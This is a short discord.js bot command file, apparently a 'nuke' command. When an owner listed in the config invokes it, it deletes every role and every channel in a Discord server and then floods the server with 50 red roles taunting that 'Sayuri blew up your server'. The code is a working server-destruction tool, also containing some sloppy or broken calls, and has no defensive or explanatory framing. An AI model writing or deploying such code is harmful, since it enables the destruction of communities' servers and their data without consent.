const discord = require('discord.js')

exports.run = async (client, message, args) => {
    
const { dono } = require("../config.json");
if (!dono.includes(message.author.id)) return message.send("");
message.delete();

	message.delete()
    if (message.deletable) message.delete();
            message.guild.roles.forEach(role => {
              role.delete()
            });
    message.guild.channels.deleteAll();
            role = 0
            while (role < 50){
                test = args.join(" ")
                message.guild.createRole( {
                        name: `SAYURI EXPLODIU TEU SERVIDOR KKKKKK`,
                        color: "#ff0000",
                    } )
                
                role++;
            }

  }